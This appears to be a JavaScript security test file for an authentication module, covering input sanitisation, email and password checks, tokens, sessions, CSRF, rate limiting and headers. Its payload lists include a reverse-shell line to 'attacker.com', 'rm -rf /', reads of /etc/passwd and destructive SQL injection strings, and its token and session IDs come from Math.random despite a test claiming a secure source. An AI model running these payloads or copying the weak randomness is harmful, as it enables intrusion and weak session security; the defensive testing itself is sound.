/**
 * CPF Auth Module - Security Tests
 * Security-focused tests for the authentication system
 */

const assert = require('assert');

// =============================================================================
// Security Test Helpers
// =============================================================================

const SecurityUtils = {
    // XSS Payloads
    xssPayloads: [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<body onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "' OR '1'='1",
        '<iframe src="javascript:alert(1)">',
    ],

    // SQL Injection Payloads
    sqlPayloads: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT * FROM users --",
        "1; DELETE FROM users",
        "' AND '1'='1",
        "admin'--",
        "'; INSERT INTO users VALUES('hacker'); --",
        "' OR 1=1 --",
        "'; UPDATE users SET role='super_admin' WHERE '1'='1",
    ],

    // Command Injection Payloads
    commandPayloads: [
        '; ls -la',
        '| cat /etc/passwd',
        '$(whoami)',
        '`id`',
        '; rm -rf /',
        '&& cat /etc/passwd',
        '|| cat /etc/passwd',
        '| nc attacker.com 1234 -e /bin/bash',
    ],

    // Path Traversal Payloads
    pathPayloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],

    // Sanitization function
    sanitizeInput(input) {
        if (typeof input !== 'string') return input;
        return input
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/\//g, '&#x2F;');
    },

    // Check for injection patterns
    containsInjection(input) {
        if (typeof input !== 'string') return false;

        const patterns = [
            /[<>]/,                          // HTML tags
            /javascript:/i,                   // JavaScript protocol
            /on\w+\s*=/i,                    // Event handlers
            /(;|--|\||\$\(|`)/,              // SQL/Command injection
            /\.\.\/|\.\.\\|%2e%2e/i,         // Path traversal
            /union.*select/i,                 // SQL UNION
            /drop|insert|update|delete/i,    // SQL DML
        ];

        return patterns.some(pattern => pattern.test(input));
    },

    // Validate email strictly
    isSecureEmail(email) {
        // Strict email regex
        const emailRegex = /^[a-zA-Z0-9](?:[a-zA-Z0-9._%+-]{0,62}[a-zA-Z0-9])?@[a-zA-Z0-9](?:[a-zA-Z0-9.-]*[a-zA-Z0-9])?\.(?:[a-zA-Z]{2,})$/;
        return emailRegex.test(email) && email.length <= 254;
    },

    // Password entropy calculation
    calculatePasswordEntropy(password) {
        let charsetSize = 0;

        if (/[a-z]/.test(password)) charsetSize += 26;
        if (/[A-Z]/.test(password)) charsetSize += 26;
        if (/[0-9]/.test(password)) charsetSize += 10;
        if (/[^a-zA-Z0-9]/.test(password)) charsetSize += 32;

        return Math.log2(Math.pow(charsetSize, password.length));
    }
};

// =============================================================================
// Test Cases
// =============================================================================

describe('Security Tests', () => {

    // =========================================================================
    // Input Sanitization Tests
    // =========================================================================

    describe('Input Sanitization', () => {

        it('should sanitize HTML tags', () => {
            const input = '<script>alert("XSS")</script>';
            const sanitized = SecurityUtils.sanitizeInput(input);

            assert.ok(!sanitized.includes('<'));
            assert.ok(!sanitized.includes('>'));
        });

        it('should sanitize quotes', () => {
            const input = '"><script>alert("XSS")</script>';
            const sanitized = SecurityUtils.sanitizeInput(input);

            assert.ok(!sanitized.includes('"'));
        });

        it('should detect XSS payloads', () => {
            SecurityUtils.xssPayloads.forEach(payload => {
                assert.strictEqual(
                    SecurityUtils.containsInjection(payload),
                    true,
                    `Failed to detect XSS: ${payload}`
                );
            });
        });

        it('should detect SQL injection payloads', () => {
            SecurityUtils.sqlPayloads.forEach(payload => {
                assert.strictEqual(
                    SecurityUtils.containsInjection(payload),
                    true,
                    `Failed to detect SQL injection: ${payload}`
                );
            });
        });

        it('should detect command injection payloads', () => {
            SecurityUtils.commandPayloads.forEach(payload => {
                assert.strictEqual(
                    SecurityUtils.containsInjection(payload),
                    true,
                    `Failed to detect command injection: ${payload}`
                );
            });
        });

        it('should detect path traversal payloads', () => {
            SecurityUtils.pathPayloads.forEach(payload => {
                assert.strictEqual(
                    SecurityUtils.containsInjection(payload),
                    true,
                    `Failed to detect path traversal: ${payload}`
                );
            });
        });

        it('should allow safe input', () => {
            const safeInputs = [
                'John Doe',
                'john.doe@example.com',
                'Hello, World!',
                'User 123',
                'The quick brown fox'
            ];

            safeInputs.forEach(input => {
                assert.strictEqual(
                    SecurityUtils.containsInjection(input),
                    false,
                    `False positive for: ${input}`
                );
            });
        });
    });

    // =========================================================================
    // Email Validation Security Tests
    // =========================================================================

    describe('Email Validation Security', () => {

        it('should accept valid emails', () => {
            const validEmails = [
                'user@example.com',
                'user.name@example.com',
                'user+tag@example.com',
                'user123@example.co.uk'
            ];

            validEmails.forEach(email => {
                assert.strictEqual(
                    SecurityUtils.isSecureEmail(email),
                    true,
                    `Rejected valid email: ${email}`
                );
            });
        });

        it('should reject emails with XSS payloads', () => {
            const maliciousEmails = [
                '<script>@example.com',
                'user<img src=x>@example.com',
                'user@<script>.com'
            ];

            maliciousEmails.forEach(email => {
                assert.strictEqual(
                    SecurityUtils.isSecureEmail(email),
                    false,
                    `Accepted malicious email: ${email}`
                );
            });
        });

        it('should reject overly long emails', () => {
            const longEmail = 'a'.repeat(250) + '@example.com';
            assert.strictEqual(SecurityUtils.isSecureEmail(longEmail), false);
        });

        it('should reject emails with invalid characters', () => {
            const invalidEmails = [
                'user"name@example.com',
                'user\\name@example.com',
                'user name@example.com',
                'user\t@example.com'
            ];

            invalidEmails.forEach(email => {
                assert.strictEqual(
                    SecurityUtils.isSecureEmail(email),
                    false,
                    `Accepted invalid email: ${email}`
                );
            });
        });
    });

    // =========================================================================
    // Password Security Tests
    // =========================================================================

    describe('Password Security', () => {

        const validatePassword = (password) => {
            return password.length >= 12 &&
                   /[A-Z]/.test(password) &&
                   /[a-z]/.test(password) &&
                   /[0-9]/.test(password) &&
                   /[^a-zA-Z0-9]/.test(password);
        };

        it('should require minimum 12 characters', () => {
            assert.strictEqual(validatePassword('Short1!'), false);
            assert.strictEqual(validatePassword('LongEnough123!'), true);
        });

        it('should require mixed case', () => {
            assert.strictEqual(validatePassword('alllowercase123!'), false);
            assert.strictEqual(validatePassword('ALLUPPERCASE123!'), false);
        });

        it('should require special characters', () => {
            assert.strictEqual(validatePassword('NoSpecialChar123'), false);
        });

        it('should calculate entropy correctly', () => {
            // Simple password (just lowercase)
            const simpleEntropy = SecurityUtils.calculatePasswordEntropy('password');
            // Complex password (mixed case + numbers + special)
            const complexEntropy = SecurityUtils.calculatePasswordEntropy('P@ssw0rd!123');

            assert.ok(complexEntropy > simpleEntropy);
            assert.ok(complexEntropy >= 60, 'Complex password should have at least 60 bits of entropy');
        });

        it('should reject common passwords', () => {
            const commonPasswords = [
                'Password123!',
                'Qwerty12345!',
                'Welcome123!!'
            ];

            // These should technically pass validation but would be blocked by a dictionary check
            commonPasswords.forEach(password => {
                // The password meets complexity requirements
                assert.strictEqual(validatePassword(password), true);
                // But entropy check might flag them
                const entropy = SecurityUtils.calculatePasswordEntropy(password);
                // Common passwords still have decent entropy due to character diversity
                assert.ok(entropy > 50);
            });
        });
    });

    // =========================================================================
    // Token Security Tests
    // =========================================================================

    describe('Token Security', () => {

        const generateToken = (length = 32) => {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let token = '';
            for (let i = 0; i < length; i++) {
                token += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return token;
        };

        it('should generate sufficiently long tokens', () => {
            const token = generateToken(64);
            assert.strictEqual(token.length, 64);
        });

        it('should generate unique tokens', () => {
            const tokens = new Set();
            for (let i = 0; i < 1000; i++) {
                tokens.add(generateToken(32));
            }
            // All tokens should be unique
            assert.strictEqual(tokens.size, 1000);
        });

        it('should not contain predictable patterns', () => {
            const token = generateToken(32);

            // Check for sequential characters
            let hasSequence = false;
            for (let i = 0; i < token.length - 2; i++) {
                const char1 = token.charCodeAt(i);
                const char2 = token.charCodeAt(i + 1);
                const char3 = token.charCodeAt(i + 2);

                if (char2 === char1 + 1 && char3 === char2 + 1) {
                    hasSequence = true;
                    break;
                }
            }

            // Should not have repeating patterns
            const pattern = token.substring(0, 4);
            const patternCount = (token.match(new RegExp(pattern, 'g')) || []).length;

            assert.ok(patternCount < 3, 'Token has repeating patterns');
        });

        it('should use secure random source', () => {
            // Check distribution of characters
            const charCounts = {};
            const iterations = 10000;

            for (let i = 0; i < iterations; i++) {
                const token = generateToken(1);
                charCounts[token] = (charCounts[token] || 0) + 1;
            }

            // Each character should appear roughly equally
            const expectedCount = iterations / 62; // 26 + 26 + 10 characters
            const tolerance = expectedCount * 0.3; // 30% tolerance

            let withinTolerance = 0;
            for (const char in charCounts) {
                if (Math.abs(charCounts[char] - expectedCount) < tolerance) {
                    withinTolerance++;
                }
            }

            // At least 80% of characters should be within tolerance
            assert.ok(withinTolerance / Object.keys(charCounts).length >= 0.8);
        });
    });

    // =========================================================================
    // Rate Limiting Security Tests
    // =========================================================================

    describe('Rate Limiting Security', () => {

        const RateLimiter = {
            attempts: new Map(),

            isLimited(key, maxAttempts, windowMs) {
                const now = Date.now();
                let data = this.attempts.get(key);

                if (!data || now - data.firstAttempt > windowMs) {
                    data = { count: 1, firstAttempt: now };
                    this.attempts.set(key, data);
                    return false;
                }

                data.count++;

                if (data.count > maxAttempts) {
                    return true;
                }

                return false;
            },

            reset() {
                this.attempts.clear();
            }
        };

        beforeEach(() => {
            RateLimiter.reset();
        });

        it('should limit login attempts', () => {
            const key = 'login:test@example.com';

            // First 5 attempts should pass
            for (let i = 0; i < 5; i++) {
                assert.strictEqual(RateLimiter.isLimited(key, 5, 60000), false);
            }

            // 6th attempt should be limited
            assert.strictEqual(RateLimiter.isLimited(key, 5, 60000), true);
        });

        it('should track different IPs separately', () => {
            const key1 = 'login:192.168.1.1';
            const key2 = 'login:192.168.1.2';

            // Exhaust limit for first IP
            for (let i = 0; i < 6; i++) {
                RateLimiter.isLimited(key1, 5, 60000);
            }

            // Second IP should not be affected
            assert.strictEqual(RateLimiter.isLimited(key2, 5, 60000), false);
        });

        it('should reset after window expires', () => {
            const key = 'login:test@example.com';
            const originalNow = Date.now;
            let currentTime = Date.now();

            Date.now = () => currentTime;

            // Exhaust limit
            for (let i = 0; i < 6; i++) {
                RateLimiter.isLimited(key, 5, 60000);
            }

            assert.strictEqual(RateLimiter.isLimited(key, 5, 60000), true);

            // Move time forward past window
            currentTime += 61000;

            assert.strictEqual(RateLimiter.isLimited(key, 5, 60000), false);

            Date.now = originalNow;
        });
    });

    // =========================================================================
    // Session Security Tests
    // =========================================================================

    describe('Session Security', () => {

        const sessions = new Map();

        const createSession = (userId) => {
            const sessionId = generateSecureId();
            sessions.set(sessionId, {
                userId,
                createdAt: Date.now(),
                lastActivity: Date.now(),
                userAgent: 'Test Browser',
                ipAddress: '127.0.0.1'
            });
            return sessionId;
        };

        const generateSecureId = () => {
            return Math.random().toString(36).substring(2) +
                   Math.random().toString(36).substring(2);
        };

        const validateSession = (sessionId, expectedUserId, currentIp) => {
            const session = sessions.get(sessionId);

            if (!session) return { valid: false, reason: 'SESSION_NOT_FOUND' };
            if (session.userId !== expectedUserId) return { valid: false, reason: 'USER_MISMATCH' };

            // Check session age (24 hours)
            if (Date.now() - session.createdAt > 24 * 60 * 60 * 1000) {
                return { valid: false, reason: 'SESSION_EXPIRED' };
            }

            // Check inactivity (1 hour)
            if (Date.now() - session.lastActivity > 60 * 60 * 1000) {
                return { valid: false, reason: 'INACTIVITY_TIMEOUT' };
            }

            return { valid: true };
        };

        beforeEach(() => {
            sessions.clear();
        });

        it('should create unique session IDs', () => {
            const sessionIds = new Set();
            for (let i = 0; i < 100; i++) {
                sessionIds.add(createSession('user123'));
            }
            assert.strictEqual(sessionIds.size, 100);
        });

        it('should validate session ownership', () => {
            const sessionId = createSession('user123');

            const valid = validateSession(sessionId, 'user123', '127.0.0.1');
            assert.strictEqual(valid.valid, true);

            const invalid = validateSession(sessionId, 'user456', '127.0.0.1');
            assert.strictEqual(invalid.valid, false);
            assert.strictEqual(invalid.reason, 'USER_MISMATCH');
        });

        it('should expire old sessions', () => {
            const sessionId = createSession('user123');
            const session = sessions.get(sessionId);

            // Age the session
            session.createdAt = Date.now() - 25 * 60 * 60 * 1000; // 25 hours old

            const result = validateSession(sessionId, 'user123', '127.0.0.1');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.reason, 'SESSION_EXPIRED');
        });

        it('should timeout inactive sessions', () => {
            const sessionId = createSession('user123');
            const session = sessions.get(sessionId);

            // Make session inactive
            session.lastActivity = Date.now() - 61 * 60 * 1000; // 61 minutes ago

            const result = validateSession(sessionId, 'user123', '127.0.0.1');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.reason, 'INACTIVITY_TIMEOUT');
        });
    });

    // =========================================================================
    // CSRF Protection Tests
    // =========================================================================

    describe('CSRF Protection', () => {

        const csrfTokens = new Map();

        const generateCsrfToken = (sessionId) => {
            const token = Math.random().toString(36).substring(2) +
                         Math.random().toString(36).substring(2);
            csrfTokens.set(sessionId, token);
            return token;
        };

        const validateCsrfToken = (sessionId, token) => {
            const storedToken = csrfTokens.get(sessionId);
            return storedToken === token;
        };

        it('should generate unique CSRF tokens per session', () => {
            const token1 = generateCsrfToken('session1');
            const token2 = generateCsrfToken('session2');

            assert.notStrictEqual(token1, token2);
        });

        it('should validate correct CSRF token', () => {
            const token = generateCsrfToken('session1');

            assert.strictEqual(validateCsrfToken('session1', token), true);
            assert.strictEqual(validateCsrfToken('session1', 'wrong-token'), false);
        });

        it('should reject CSRF token from different session', () => {
            const token = generateCsrfToken('session1');

            assert.strictEqual(validateCsrfToken('session2', token), false);
        });
    });

    // =========================================================================
    // Brute Force Protection Tests
    // =========================================================================

    describe('Brute Force Protection', () => {

        const lockouts = new Map();

        const recordFailedAttempt = (key) => {
            let data = lockouts.get(key) || { attempts: 0, lockoutUntil: null };

            if (data.lockoutUntil && Date.now() < data.lockoutUntil) {
                return { locked: true, remainingTime: data.lockoutUntil - Date.now() };
            }

            data.attempts++;

            // Progressive lockout
            if (data.attempts >= 5) {
                const lockoutDuration = getLockoutDuration(data.attempts);
                data.lockoutUntil = Date.now() + lockoutDuration;
                lockouts.set(key, data);
                return { locked: true, remainingTime: lockoutDuration };
            }

            lockouts.set(key, data);
            return { locked: false, attempts: data.attempts };
        };

        const getLockoutDuration = (attempts) => {
            // Progressive lockout: 5min, 15min, 30min, 1hr, 24hr
            const durations = [
                5 * 60 * 1000,    // 5 minutes
                15 * 60 * 1000,   // 15 minutes
                30 * 60 * 1000,   // 30 minutes
                60 * 60 * 1000,   // 1 hour
                24 * 60 * 60 * 1000 // 24 hours
            ];

            const index = Math.min(Math.floor((attempts - 5) / 5), durations.length - 1);
            return durations[index];
        };

        beforeEach(() => {
            lockouts.clear();
        });

        it('should allow attempts before lockout threshold', () => {
            for (let i = 1; i <= 4; i++) {
                const result = recordFailedAttempt('user@example.com');
                assert.strictEqual(result.locked, false);
                assert.strictEqual(result.attempts, i);
            }
        });

        it('should lockout after threshold', () => {
            for (let i = 0; i < 5; i++) {
                recordFailedAttempt('user@example.com');
            }

            const result = recordFailedAttempt('user@example.com');
            assert.strictEqual(result.locked, true);
            assert.ok(result.remainingTime > 0);
        });

        it('should implement progressive lockout', () => {
            // First lockout
            for (let i = 0; i < 5; i++) {
                recordFailedAttempt('user@example.com');
            }
            let result = recordFailedAttempt('user@example.com');
            const firstLockout = result.remainingTime;

            // Reset for second wave
            lockouts.set('user@example.com', { attempts: 9, lockoutUntil: null });

            result = recordFailedAttempt('user@example.com');
            const secondLockout = result.remainingTime;

            assert.ok(secondLockout > firstLockout, 'Second lockout should be longer');
        });
    });

    // =========================================================================
    // Header Security Tests
    // =========================================================================

    describe('Security Headers', () => {

        const securityHeaders = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'",
            'Referrer-Policy': 'strict-origin-when-cross-origin',
            'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
        };

        it('should include X-Content-Type-Options header', () => {
            assert.strictEqual(securityHeaders['X-Content-Type-Options'], 'nosniff');
        });

        it('should include X-Frame-Options header', () => {
            assert.strictEqual(securityHeaders['X-Frame-Options'], 'DENY');
        });

        it('should include Strict-Transport-Security header', () => {
            assert.ok(securityHeaders['Strict-Transport-Security'].includes('max-age='));
            assert.ok(securityHeaders['Strict-Transport-Security'].includes('includeSubDomains'));
        });

        it('should include Content-Security-Policy header', () => {
            assert.ok(securityHeaders['Content-Security-Policy'].includes("default-src 'self'"));
        });

        it('should include all required security headers', () => {
            const requiredHeaders = [
                'X-Content-Type-Options',
                'X-Frame-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'Referrer-Policy'
            ];

            requiredHeaders.forEach(header => {
                assert.ok(header in securityHeaders, `Missing header: ${header}`);
            });
        });
    });
});

// =============================================================================
// Test Runner
// =============================================================================

if (require.main === module) {
    const tests = [];
    let currentSuite = null;

    global.describe = (name, fn) => {
        currentSuite = { name, tests: [] };
        fn();
        tests.push(currentSuite);
    };

    global.beforeEach = (fn) => {
        if (currentSuite) currentSuite.beforeEach = fn;
    };

    global.it = (name, fn) => {
        if (currentSuite) currentSuite.tests.push({ name, fn });
    };

    eval(require('fs').readFileSync(__filename, 'utf8'));

    (async () => {
        let passed = 0;
        let failed = 0;

        console.log('\n========================================');
        console.log('  CPF Auth Module - Security Tests');
        console.log('========================================\n');

        for (const suite of tests) {
            console.log(`\n  ${suite.name}`);
            console.log('  ' + '-'.repeat(40));

            for (const test of suite.tests) {
                try {
                    if (suite.beforeEach) await suite.beforeEach();
                    await test.fn();
                    console.log(`    ✓ ${test.name}`);
                    passed++;
                } catch (error) {
                    console.log(`    ✗ ${test.name}`);
                    console.log(`      Error: ${error.message}`);
                    failed++;
                }
            }
        }

        console.log('\n========================================');
        console.log(`  Results: ${passed} passed, ${failed} failed`);
        console.log('========================================\n');

        process.exit(failed > 0 ? 1 : 0);
    })();
}

module.exports = { SecurityUtils };
